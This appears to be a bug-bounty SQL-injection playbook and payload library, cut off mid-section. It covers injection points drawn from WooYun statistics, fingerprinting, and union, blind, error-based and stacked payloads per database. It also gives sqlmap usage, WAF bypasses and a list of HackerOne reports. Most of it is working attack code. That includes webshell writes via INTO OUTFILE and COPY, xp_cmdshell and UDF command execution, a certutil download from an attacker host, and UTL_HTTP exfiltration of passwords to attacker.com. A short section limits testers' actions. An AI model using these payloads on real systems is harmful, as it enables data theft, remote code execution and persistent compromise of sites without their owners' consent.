# SQL Injection

> Perspective: black-box; the goal is going from 0 to obtaining data / obtaining privileges

## 1. In one sentence

SQLi = promoting "data" into a "SQL instruction."
SRC value: SQLi that can dump the database or read the admin hash → P1; escalation to DBA privileges or RCE → P0.
Across the 27,732 WooYun cases, **66% were in login boxes, 64% in search, 60% in POST forms, 26% in HTTP Headers**.

---

## 2. High-frequency entry points (statistics over 27,732 cases)

### 2.1 High-frequency dangerous parameter names (by frequency)

```python
# Numeric ID type (most common)
'id': 56,           'sort_id': 37,      'stid': 32,
'fid': 8,           'hotelid': 11,      'areainfoid': 8,

# Authentication (high-risk)
'username': 33,     'password': 30,     'userpwd': 11,

# Business
'type': 18,         'action': 7,        'page': 4,
'name': 30,

# ASP.NET specific (must check for .NET applications)
'__viewstate': 58,  '__eventvalidation': 56,
'__eventargument': 52, '__eventtarget': 41,
```

### 2.2 Injection-vector distribution

| Vector | Share | Typical |
|------|------|------|
| Login box | 66% | username/password field concatenation |
| Search box | 64% | LIKE fuzzy matching |
| POST parameter | 60% | form submission |
| HTTP Header | 26% | User-Agent / Referer / X-Forwarded-For |
| GET parameter | 24% | URL |
| Cookie | 12% | session identifier |

### 2.3 URL patterns

```
# List / detail
/news/detail.php?id=1
/product/view.aspx?pid=123
/article.asp?aid=456

# Search
/search.php?keyword=test
/list.aspx?stid=5882&pageid=2

# Backend
/admin/login.aspx
/manage/user.php?action=edit&uid=1

# API
/api/getData.php?type=user&id=1
```

### 2.4 Backend-type quick table

| Suffix | Database | Error keyword |
|------|--------|----------|
| `.php` | MySQL | `You have an error in your SQL syntax` |
| `.aspx` | MSSQL / Oracle | `Unclosed quotation mark` / `Microsoft OLE DB` |
| `.asp` | Access / MSSQL | `Microsoft JET Database Engine` |
| `.jsp` / `.do` / `.action` | Oracle / MySQL | `ORA-00942` / SQL exception |
| Modern API (JSON) | any ORM | look at response fields / backend framework |

---

## 3. Probing techniques

### 3.1 Confirming the injection point

```sql
id=1'                 # error?
id=1"
id=1)
id=1;
id=1--
id=1#
id=1 AND 1=1          # normal
id=1 AND 1=2          # abnormal
id=1*1                # numeric type uses arithmetic
id=1-0
id=1 AND sleep(3)     # time-blind probe
```

Observe:
- Response content difference (page change)
- Response length difference
- Response time difference (blind injection)
- Error message (leaks the database type)

### 3.2 Database fingerprinting

```sql
-- MySQL
SELECT version()                                    → 5.7.x / 8.x
SELECT @@version
SELECT user(), database()
AND sleep(5)
AND benchmark(10000000, sha1('a'))

-- MSSQL
SELECT @@version
SELECT db_name(), system_user
WAITFOR DELAY '0:0:5'

-- Oracle
SELECT banner FROM v$version WHERE rownum=1
SELECT user FROM dual
AND dbms_pipe.receive_message('a',5)=1

-- PostgreSQL
SELECT version()
SELECT current_database(), current_user
SELECT pg_sleep(5)

-- SQLite
SELECT sqlite_version()

-- Access
SELECT TOP 1 1 FROM MSysObjects     # specific, no #/-- comments
```

### 3.3 Payload templates per injection technique

#### Boolean blind

```
id=1 AND 1=1
id=1 AND 1=2

id=1' AND '1'='1
id=1' AND '1'='2

id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
id=1 AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'

# RLIKE / REGEXP
id=8 RLIKE (SELECT (CASE WHEN (7706=7706) THEN 8 ELSE 0x28 END))
```

#### Time blind

```
# MySQL
id=1 AND sleep(5)
id=1 AND IF(1=1,sleep(5),0)
id=(SELECT(CASE WHEN(1=1) THEN SLEEP(5) ELSE 1 END))

# Double-layer delay (bypass single-layer sleep detection)
id=(select(2)from(select(sleep(8)))v)/*'+(select(0)from(select(sleep(0)))v)+'

# MSSQL
id=1; WAITFOR DELAY '0:0:5'--

# Oracle
id=1 AND dbms_pipe.receive_message('a',5)=1

# PostgreSQL
id=1 AND pg_sleep(5)
```

#### Union query

```
# Probe column count
id=1 ORDER BY 1--   ... ORDER BY N-- (when it errors, N-1 is the column count)

# Union
id=-1 UNION SELECT 1,2,3,4,5--
id=-1 UNION SELECT null,null,null--

# Data
id=-1 UNION SELECT 1,database(),version(),user(),5--
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

#### Error-based injection

```
# MySQL extractvalue
id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))

# MySQL updatexml
id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)

# MySQL floor
id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)

# MSSQL CONVERT
id=1 AND 1=CONVERT(INT,(SELECT @@version))
```

#### Stacked (MSSQL / PostgreSQL)

```
id=1; SELECT pg_sleep(5)--
id=1; EXEC xp_cmdshell 'whoami'--
```

### 3.4 Full exploitation-chain cheatsheet

#### MySQL

```sql
-- Step 1
union select 1,database(),version(),user(),5--

-- Step 2: all databases
union select 1,group_concat(schema_name),3 from information_schema.schemata--

-- Step 3: tables of the current database
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--

-- Step 4: column names
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--

-- Step 5: data
union select 1,group_concat(username,0x3a,password),3 from users--

-- Step 6: file read (FILE privilege)
union select 1,load_file('/etc/passwd'),3--

-- Step 7: webshell (FILE + write permission + known path)
union select 1,'<?php @system($_POST[c]);?>',3 into outfile '/var/www/html/shell.php'--
```

#### MSSQL

```sql
union select 1,@@version,db_name(),system_user,5--
union select 1,name,3 from master..sysdatabases--
union select 1,name,3 from sysobjects where xtype='U'--
union select 1,name,3 from syscolumns where id=object_id('users')--

-- Command execution (sa)
; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
  EXEC master..xp_cmdshell 'whoami'--
```

#### Oracle

```sql
union select banner,null from v$version where rownum=1--
union select user,null from dual--
union select table_name,null from all_tables where rownum<=10--
```

### 3.5 Tools

```bash
# sqlmap (most common)
sqlmap -u "https://target/page.php?id=1" --batch
sqlmap -r request.txt --batch                # use a request saved from Burp
sqlmap -u "..." --dbs                        # list databases
sqlmap -u "..." -D dbname --tables
sqlmap -u "..." -D dbname -T users --columns
sqlmap -u "..." -D dbname -T users -C "username,password" --dump --start 1 --stop 3   # limit to 3 rows
sqlmap -u "..." --tamper=between,space2comment,charencode    # chain multiple tampers
sqlmap -u "..." --time-sec=10 --technique=T   # time-blind only
sqlmap -u "..." --os-shell                    # only in authorized scenarios
```

---

## 4. Bypass matrix (see methodology/02-bypass-toolkit.md for details)

| Dimension | Payload |
|------|---------|
| Keyword | `UnIoN SeLeCt` / `un/**/ion sel/**/ect` / `/*!50000union*//*!50000select*/` |
| Space | `/**/` / `%09` / `%0a` / parentheses / `+` |
| Quote | `0x...` hex / `char()` / `%df%27` (GBK wide byte) |
| Function | `mid()`/`substr()`/`substring()`/`left()` interchangeable; `if()`/`case when` |
| Equal sign | `LIKE`/`REGEXP`/`IN(1)`/`BETWEEN` |
| Comment | `--` / `#` / `/**/` / `;%00` |
| Second-order injection | store first (with `'`) then trigger the query |
| Entry switch | Header / Cookie / X-Forwarded-For injection |

### sqlmap tamper cheat sheet

```
between, space2comment, charencode, bluecoat, modsecurityzeroversioned,
versionedmorekeywords, randomcase, percentage, equaltolike, apostrophemask,
space2hash, space2mssqlblank, space2plus
```

### Real WooYun bypass payloads

```
# Inline comment (classic DeDeCMS bypass)
aid=1&_FILES[type][tmp_name]=\' or mid=@`\'` /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd) from `#@__admin` limit 0,1),5,6,7,8,9#@`\'`

# Double-layer sleep (wooyun-2015-0114228)
hotelid=(select(2)from(select(sleep(8)))v)
hotelid=(SELECT (CASE WHEN (8177=8177) THEN SLEEP(10) ELSE 8177*(SELECT 8177 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))

# Error chain (wooyun-2015-0157074)
txtuser=-7004' OR 6089=6089#
txtuser=-8086' OR 1 GROUP BY CONCAT(0x716b767171,(SELECT (CASE WHEN (5800=5800) THEN 1 ELSE 0 END)),0x7171627171,FLOOR(RAND(0)*2)) HAVING MIN(0)#
```

---

## 5. Exploitation for escalation / lateral

```
SQLi
  → get admin hash → offline cracking (rockyou.txt) → log into the backend
  → get full table data
  → get DB version → find a known CVE
  → DBA privileges → load_file / outfile → arbitrary file read/write → Webshell → RCE
  → MSSQL xp_cmdshell → RCE
  → stacked injection + xp_cmdshell (MSSQL)
  → Oracle UTL_HTTP.request → SSRF
```

Reference case: wooyun-2015-0157074 Guangzhou Jiahang Software, DBA privileges + root hash + 512 user passwords.

---

## 6. Real-case fingerprints

| Type | wooyun ID | Payload characteristic |
|------|----------|------------|
| Error + boolean | wooyun-2015-0157074 | `txtuser=-7004' OR 6089=6089#` |
| Double-layer time blind | wooyun-2015-0114228 | `(select(2)from(select(sleep(8)))v)` |
| Inline comment | wooyun-2015-0113920 | `/*!50000union*//*!50000select*/` |
| ASP.NET ViewState | many | modify `__VIEWSTATE` to trigger deserialization |
| Header injection | many | `User-Agent: 1' AND ...` |

Common fingerprints:
- Error message contains `MySQL syntax error` / `near` / `unclosed quotation` / `ORA-00942` → database type confirmed
- Same parameter `?id=1 AND sleep(5)` 5s delay + `?id=1 AND sleep(0)` 0s = 100% time blind
- `?id=1` and `?id=2-1` return the same = numeric type, injectable

---

## 7. Reproduction / evidence essentials

### 7.1 Report must-haves

1. **Baseline**: `?id=1` normal response
2. **Injection proof**: error / boolean difference / time difference (≥5s stable)
3. **Data evidence**: `version()`, `current_database()`, first-row admin username (redacted)
4. **Impact escalation chain**: can you read the admin hash? read other databases? outfile?

### 7.2 PoC template

```http
GET /api/search?keyword=test' AND (SELECT SLEEP(5))-- - HTTP/1.1
Host: target.com

→ response time: 5.234s

GET /api/search?keyword=test' AND (SELECT SLEEP(0))-- - HTTP/1.1
→ response time: 0.087s

# 5 reproductions
1: 5.21s vs 0.09s
2: 5.18s vs 0.07s
3: 5.31s vs 0.08s
4: 5.22s vs 0.09s
5: 5.19s vs 0.08s

# Data proof
GET /api/search?keyword=test' UNION SELECT 1,version(),3-- -

→ response: [{"id":1,"name":"5.7.34-log","desc":3}]
```

### 7.3 sqlmap log attachment

```
Keep the sqlmap -v 3 output log to prove the tool identified it as injectable.
The log contains:
  [INFO] testing connection to the target URL
  [INFO] testing if the target URL content is stable
  [INFO] target URL content is stable
  ...
  [INFO] (parameter) is vulnerable. Do you want to keep testing the others (if any)? [y/N]
```

### 7.4 CVSS

```
Unauthenticated SQLi (can dump DB)   CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1
Authenticated SQLi                   CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N = 8.1
SQLi → RCE (DBA)                     = 9.8
Time-blind only / cannot dump        CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N = 5.3
```

### 7.5 Impact section

```
Via the keyword parameter of the /api/search endpoint, an attacker can inject SQL instructions;
the time-based blind injection reliably produces a 5-second delay difference (5/5 reproduced).

Via UNION SELECT it was confirmed:
1. Database version 5.7.34-log (MySQL)
2. Current database prod_main
3. An admin user exists in the users table (username prefix ad****)

I did not attempt to dump the full data / read the admin password hash / write a file with outfile.
```

---

## 8. Things not to do

- **Forbidden**: full table dump with sqlmap (even if you can). `--start 1 --stop 3` for 3 sample rows is enough.
- **Forbidden**: actually writing a file with outfile / executing commands with xp_cmdshell. "Proving it is possible" is enough.
- **Forbidden**: pasting others' full PII into the report. Redact to just the first 2 + last 2 characters.
- **Forbidden**: actually logging into the target backend after offline-cracking the obtained admin hash.
- **Forbidden**: stacking DROP / DELETE / UPDATE statements. SELECT only.
- **Restriction**: sqlmap's default threads are aggressive; use `--threads=1 --delay=1`.
- **In the report**: write the admin password hash as the first 8 characters + sha256 of the full hash.

## H1 real cases

_A total of 147 disclosed HackerOne High/Critical reports hit this category, sorted by (bounty + votes×100), taking the Top 12_

| Severity | $ | Program | Title (click for the original report) | Summary |
|---|--:|---|---|---|
| Critical | — | Starbucks | [SQL Injection Extracts Starbucks Enterprise Accounting, Financial, Payroll Database](https://hackerone.com/reports/531051) | SQL Injection Extracts Starbucks Enterprise Accounting, Financial, Payroll Database |
| Critical | — | GSA Bounty | [SQL injection in https://labs.data.gov/dashboard/datagov/csv_to_json via User-agent](https://hackerone.com/reports/297478) | I've identified an SQL injection vulnerability in the website **labs.data.gov** that affects the endpoint `/dashboard/datagov/c… |
| Critical | 25000 usd | Valve | [SQL Injection in report_xml.php through countryFilter[] parameter](https://hackerone.com/reports/383127) | SQL Injection in report_xml.php through countryFilter[] parameter |
| Critical | 4500 usd | Eternal | [[www.zomato.com] SQLi - /php/██████████ - item_id](https://hackerone.com/reports/403616) | [www.zomato.com] SQLi - /php/██████████ - item_id |
| High | — | MTN Group | [SQL Injection on cookie parameter](https://hackerone.com/reports/761304) | Summary: Hello team. It seams one of the parameters in the cookies is vulnerable to SQL injection. Below requests has the lang … |
| High | 4500 usd | Grab | [www.drivegrab.com SQL injection](https://hackerone.com/reports/273946) | Summary:** The website uses a WordPress plugin called Formidable Pro. I found an SQL injection in the plugin code. Description:… |
| Critical | 4134 usd | inDrive | [Blind SQL injection on id.indrive.com](https://hackerone.com/reports/2051931) | Summary: The server does not perform sanitization on user input, allowing an attacker to inject arbitrary SQL commands into a q… |
| High | — | Acronis | [SQL Injection in agent-manager](https://hackerone.com/reports/962889) | 1.https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=15902… |
| Critical | — | Starbucks | [Blind SQLi leading to RCE, from Unauthenticated access to a test API Webservice](https://hackerone.com/reports/592400) | Blind SQLi leading to RCE, from Unauthenticated access to a test API Webservice |
| High | — | Starbucks | [Blind SQL Injection on starbucks.com.gt and WAF Bypass  :*](https://hackerone.com/reports/549355) | Blind SQL Injection on starbucks.com.gt and WAF Bypass :* |
| Critical | — | HackerOne | [SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter](https://hackerone.com/reports/435066) | The `embedded_submission_form_uuid` parameter in the `/graphql` endpoint is vulnerable to a SQL injection |
| High | — | Automattic | [Sql injection on docs.atavist.com](https://hackerone.com/reports/1039315) | hello dear team I have found SQL injection on docs.atavist.com url:http://docs.atavist.com/reader_api/stories.php?limit=10&offs… |

**Weakness distribution for hits in this category:**

- SQL Injection: 140 entries
- Uncategorized → manually classified: 2 entries
- XML Injection: 2 entries
- LDAP Injection: 2 entries
- Blind SQL Injection: 1 entry

## Payload library

_17 structured web payloads, including full attack chains + WAF/EDR bypass variants_

### MySQL injection - basic probing  `sqli-mysql-basic`
MySQL database injection basic probing and data-extraction techniques
Sub-category: **MySQL** · tags: `sqli` `mysql` `injection` `database`

**Prerequisites:** an SQL injection point exists on the target; the backend database is MySQL; understanding of basic SQL syntax

**Attack chain:**

**1. 1. Probe the injection point**
_Use a single quote and boolean conditions to probe whether an injection point exists_
```
' OR '1'='1
' OR 1=1--
1' AND '1'='1
1' AND '1'='2
```

**2. 2. Determine the column count**
_Use ORDER BY or UNION SELECT NULL to determine the query column count_
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
Until it errors, determining the column count
Or use:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**3. 3. Determine the display position**
_Find out which columns are displayed on the page_
```
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
```

**4. 4. Obtain database information**
_Obtain basic info such as the current database name, user, version_
```
' UNION SELECT 1,database(),3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,version(),3--
' UNION SELECT 1,@@hostname,3--
```

**5. 5. Enumerate all databases**
_Obtain all database names on the MySQL server_
```
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--
' UNION SELECT schema_name,2,3 FROM information_schema.schemata LIMIT 0,1--
```

**6. 6. Enumerate table names**
_Obtain all table names in the specified database_
```
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='target_db' LIMIT 0,1--
```

**7. 7. Enumerate column names**
_Obtain all column names of the specified table_
```
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' AND table_schema=database() LIMIT 0,1--
```

**8. 8. Extract data**
_Extract sensitive data from the target table_
```
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
' UNION SELECT username,password,3 FROM users LIMIT 0,1--
```

**WAF/EDR bypass variants:**

**1. Case obfuscation**
_Use mixed case to bypass keyword filtering_
```
' UnIoN SeLeCt 1,database(),3--
' uNiOn SeLeCt 1,user(),3--
```

**2. Inline comment**
_Use MySQL-specific inline comments to bypass_
```
' /*!UNION*/ /*!SELECT*/ 1,database(),3--
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
```

**3. Double-write bypass**
_Double-write keywords to bypass replacement filtering_
```
' UNUNIONION SELSELECTECT 1,database(),3--
' UNIunionON SELselectECT 1,2,3--
```

**4. Space substitution**
_Use comments, newlines, parentheses to substitute spaces_
```
'/**/UNION/**/SELECT/**/1,database(),3--
' %0aUNION%0aSELECT%0a1,2,3--
'(UNION(SELECT(1),(database()),(3)))--
```

**5. Encoding bypass**
_Use encoding functions to bypass keyword detection_
```
' UNION SELECT 1,hex(database()),3--
' UNION SELECT 1,unhex(hex(database())),3--
' UNION SELECT 1,conv(hex(database()),16,10),3--
```

---

### MySQL injection - advanced techniques  `sqli-mysql-advanced`
MySQL advanced injection techniques: file read/write, UDF privilege escalation, command execution
Sub-category: **MySQL** · tags: `sqli` `mysql` `advanced` `file-read` `rce`

**Prerequisites:** the MySQL user has the FILE privilege; the website's absolute path is known; the secure_file_priv configuration allows it

**Attack chain:**

**1. 1. Detect the FILE privilege**
_Detect whether the current user has the FILE privilege_
```
' UNION SELECT 1,file_priv,3 FROM mysql.user WHERE user=current_user()--
' AND (SELECT file_priv FROM mysql.user WHERE user=current_user())='Y'--
```

**2. 2. Obtain the website path**
_Obtain the website path via error messages or file reading_
```
' UNION SELECT 1,@@basedir,3--
' UNION SELECT 1,@@datadir,3--
' UNION SELECT 1,load_file('/etc/passwd'),3--
```

**3. 3. Read sensitive files**
_Use load_file to read sensitive system files_
```
' UNION SELECT 1,load_file('/etc/passwd'),3--
' UNION SELECT 1,load_file('/var/www/html/config.php'),3--
' UNION SELECT 1,load_file('C:/windows/win.ini'),3--
```

**4. 4. Write a WebShell**  _[linux]_
_Use INTO OUTFILE to write a WebShell_
```
' UNION SELECT 1,'<?php @eval($_POST[cmd]);?>',3 INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 1,'<?php system($_GET[c]);?>',3 INTO OUTFILE '/var/www/html/cmd.php'--
```

**5. 5. Log-write shell**  _[linux]_
_Write a shell by enabling general_log_
```
SET GLOBAL general_log='ON';
SET GLOBAL general_log_file='/var/www/html/shell.php';
SELECT '<?php @eval($_POST[cmd]);?>';
```

**6. 6. UDF privilege escalation**  _[linux]_
_Use UDF privilege escalation to execute system commands_
```
SELECT load_file('/tmp/lib_mysqludf_sys.so') INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT sys_eval('id');
```

**WAF/EDR bypass variants:**

**1. Hex-encoded write**  _[linux]_
_Use hexadecimal encoding to bypass keyword detection_
```
' UNION SELECT 1,0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e,3 INTO DUMPFILE '/var/www/html/shell.php'--
```

**2. Char-encoding bypass**  _[linux]_
_Use the CHAR function encoding to bypass_
```
' UNION SELECT 1,CHAR(60,63,112,104,112,32,64,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,59,63,62),3 INTO OUTFILE '/var/www/html/s.php'--
```

---

### MSSQL injection - basic probing  `sqli-mssql-basic`
Microsoft SQL Server database injection techniques
Sub-category: **MSSQL** · tags: `sqli` `mssql` `sqlserver` `injection`

**Prerequisites:** an SQL injection point exists on the target; the backend uses an MSSQL database

**Attack chain:**

**1. 1. Probe the injection point**
_Basic injection probing_
```
' OR 1=1--
' OR '1'='1
1' AND 1=1--
1' AND 1=2--
```

**2. 2. Obtain version information**
_Obtain MSSQL version information_
```
' UNION SELECT 1,@@version,3--
' UNION SELECT 1,SERVERPROPERTY('Edition'),3--
' UNION SELECT 1,SERVERPROPERTY('ProductVersion'),3--
```

**3. 3. Obtain user information**
_Obtain the current user and privilege information_
```
' UNION SELECT 1,user_name(),3--
' UNION SELECT 1,suser_name(),3--
' UNION SELECT 1,system_user,3--
' UNION SELECT 1,is_srvrolemember('sysadmin'),3--
```

**4. 4. Obtain database information**
_Obtain all database names_
```
' UNION SELECT 1,db_name(),3--
' UNION SELECT 1,db_name(0),3--
' UNION SELECT 1,db_name(1),3--
' UNION SELECT name,2,3 FROM master..sysdatabases--
```

**5. 5. Obtain table names**
_Obtain user table names_
```
' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--
' UNION SELECT 1,name,3 FROM sys.tables--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
```

**6. 6. Obtain column names**
_Obtain the column names of the specified table_
```
' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
```

**7. 7. Extract data**
_Extract data from the table_
```
' UNION SELECT 1,username+':'+password,3 FROM users--
' UNION SELECT TOP 1 username,password,3 FROM users--
```

**WAF/EDR bypass variants:**

**1. Hex encoding**
_Use Hex encoding to bypass_
```
' UNION SELECT 1,master.dbo.fn_varbintohexstr(CAST(username AS VARBINARY)),3 FROM users--
```

**2. Comment bypass**
_Use comments and null bytes to bypass_
```
'/**/UNION/**/SELECT/**/1,2,3--
' UN%00ION SELECT 1,2,3--
```

---

### MSSQL injection - advanced techniques  `sqli-mssql-advanced`
MSSQL advanced injection: xp_cmdshell, SP_OACREATE command execution
Sub-category: **MSSQL** · tags: `sqli` `mssql` `xp_cmdshell` `rce`

**Prerequisites:** MSSQL has high privileges; xp_cmdshell is available or can be enabled

**Attack chain:**

**1. 1. Detect the xp_cmdshell status**  _[windows]_
_Detect whether xp_cmdshell is available_
```
' UNION SELECT 1,OBJECT_ID('xp_cmdshell'),3--
'; EXEC master..xp_cmdshell 'whoami'--
```

**2. 2. Enable xp_cmdshell**  _[windows]_
_If xp_cmdshell is disabled, try to enable it_
```
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

**3. 3. Execute system commands**  _[windows]_
_Use xp_cmdshell to execute system commands_
```
'; EXEC master..xp_cmdshell 'whoami'--
'; EXEC master..xp_cmdshell 'net user'--
'; EXEC master..xp_cmdshell 'dir C:'--
```

**4. 4. Write a WebShell**  _[windows]_
_Write or download a WebShell_
```
'; EXEC master..xp_cmdshell 'echo ^<%execute(request("cmd"))^> > C:\inetpub\wwwroot\shell.asp'--
'; EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://attacker/shell.aspx C:\inetpub\wwwroot\shell.aspx'--
```

**5. 5. SP_OACREATE method**  _[windows]_
_Use SP_OACREATE to execute commands_
```
'; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @shell INT;
EXEC SP_OACREATE 'wscript.shell', @shell OUTPUT;
EXEC SP_OAMETHOD @shell, 'run', NULL, 'cmd /c whoami > C:\output.txt';--
```

**WAF/EDR bypass variants:**

**1. Stacked query**  _[windows]_
_Use dynamic SQL to bypass_
```
'; EXEC('EXEC master..xp_cmdshell ''whoami''')--
'; DECLARE @cmd VARCHAR(255); SET @cmd='whoami'; EXEC master..xp_cmdshell @cmd;--
```

---

### Oracle injection - basic probing  `sqli-oracle-basic`
Oracle database injection basic techniques
Sub-category: **Oracle** · tags: `sqli` `oracle` `injection`

**Prerequisites:** an SQL injection point exists on the target; the backend uses an Oracle database

**Attack chain:**

**1. 1. Probe the injection point**
_Probe the injection-point type_
```
' OR 1=1--
' OR '1'='1
' UNION SELECT NULL,NULL,NULL FROM DUAL--
```

**2. 2. Obtain version information**
_Obtain the Oracle version_
```
' UNION SELECT banner,NULL FROM v$version WHERE rownum=1--
' UNION SELECT version,NULL FROM v$instance--
```

**3. 3. Obtain user information**
_Obtain the database user_
```
' UNION SELECT username,NULL FROM all_users--
' UNION SELECT user,NULL FROM DUAL--
' UNION SELECT SYS_CONTEXT('USERENV','SESSION_USER'),NULL FROM DUAL--
```

**4. 4. Obtain table names**
_Obtain table names_
```
' UNION SELECT table_name,NULL FROM all_tables WHERE owner='SCOTT'--
' UNION SELECT owner||'.'||table_name,NULL FROM all_tables--
```

**5. 5. Obtain column names**
_Obtain column names and data types_
```
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT column_name||':'||data_type,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

**6. 6. Extract data**
_Extract table data_
```
' UNION SELECT username||':'||password,NULL FROM users--
' UNION SELECT * FROM (SELECT username,password FROM users) WHERE rownum<=1--
```

**WAF/EDR bypass variants:**

**1. UTL_HTTP exfiltration**
_Use UTL_HTTP to exfiltrate data_
```
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)),NULL FROM DUAL--
```

---

### Oracle injection - advanced techniques  `sqli-oracle-advanced`
Oracle advanced injection techniques: Java stored procedures, UTL_FILE file operations
Sub-category: **Oracle** · tags: `sqli` `oracle` `advanced` `rce`

**Prerequisites:** Oracle high privileges; the Java virtual machine is available

**Attack chain:**

**1. 1. Detect Java privileges**
_Detect whether Java stored procedures are available_
```
' UNION SELECT 1,CASE WHEN DBMS_JAVA.TEST_OUTPUT('test') IS NOT NULL THEN 'YES' ELSE 'NO' END FROM DUAL--
```

**2. 2. Create a Java execution function**
_Use Java to execute system commands_
```
' UNION SELECT 1,(SELECT DBMS_JAVA.RUNJAVA('java.lang.Runtime.exec("cmd /c whoami")') FROM DUAL)--
```

**3. 3. UTL_FILE to read files**
_Use UTL_FILE to operate on files_
```
' UNION SELECT 1,UTL_FILE.FGETATTR('DATA_PUMP_DIR','/etc/passwd','file_exists') FROM DUAL--
```

**WAF/EDR bypass variants:**

**1. Oracle-specific function bypass**
_Use Oracle-specific functions such as XMLType, DBMS_PIPE, CASE expressions to bypass WAF keyword detection_
```
' UNION SELECT 1,XMLType('<root>'||CHR(60)||'data'||CHR(62)||user||'</data></root>') FROM DUAL--
' UNION SELECT 1,DBMS_PIPE.PACK_MESSAGE(user)||DBMS_PIPE.SEND_MESSAGE('pipe1') FROM DUAL--
' UNION SELECT 1,CASE WHEN (SELECT user FROM DUAL)='SYS' THEN 'admin' ELSE 'user' END FROM DUAL--
```

**2. Oracle comment and encoding bypass**
_Use comment characters to substitute spaces, CHR() to encode strings, RAWTOHEX/UTL_ENCODE to encode data for bypass_
```
' UNION/**/SELECT/**/1,user/**/FROM/**/DUAL--
' UNION SELECT 1,CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78) FROM DUAL--
' UNION SELECT 1,RAWTOHEX(user) FROM DUAL--
' UNION SELECT 1,UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW(user))) FROM DUAL--
```

---

### PostgreSQL injection - basic probing  `sqli-postgres-basic`
PostgreSQL database injection techniques
Sub-category: **PostgreSQL** · tags: `sqli` `postgresql` `postgres` `injection`

**Prerequisites:** an SQL injection point exists on the target; the backend uses PostgreSQL

**Attack chain:**

**1. 1. Probe the injection point**
_Probe the injection point_
```
' OR 1=1--
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
```

**2. 2. Obtain version information**
_Obtain database information_
```
' UNION SELECT version(),NULL--
' UNION SELECT current_database(),NULL--
' UNION SELECT current_user,NULL--
```

**3. 3. Obtain table names**
_Obtain tables in the public schema_
```
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--
```

**4. 4. Obtain column names**
_Obtain column names_
```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

**5. 5. Read files**  _[linux]_
_Use pg_read_file to read files_
```
' UNION SELECT pg_read_file('/etc/passwd'),NULL--
' UNION SELECT pg_read_binary_file('/etc/passwd'),NULL--
```

**6. 6. Write files**  _[linux]_
_Use COPY to write files_
```
' UNION SELECT 'test',COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/html/shell.php'--
```

**WAF/EDR bypass variants:**

**1. Encoding bypass**
_Use the chr function for encoding_
```
' UNION SELECT chr(60)||chr(63)||'php system($_GET[c]);'||chr(63)||chr(62),NULL--
```

---

### SQLite injection  `sqli-sqlite-basic`
SQLite database injection attack
Sub-category: **SQLite** · tags: `sqli` `sqlite`

**Prerequisites:** a SQLite database; an injection point exists

**Attack chain:**

**1. 1. Probe the injection point**
_Probe the injection point_
```
' OR 1=1--
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
```

**2. 2. Obtain the version**
_Obtain the SQLite version_
```
' UNION SELECT sqlite_version(),NULL--
```

**3. 3. Obtain table names**
_Obtain all table names_
```
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
```

**4. 4. Obtain the table structure**
_Obtain the CREATE TABLE statement_
```
' UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'--
```

**5. 5. Read files**
_Read files (requires an extension)_
```
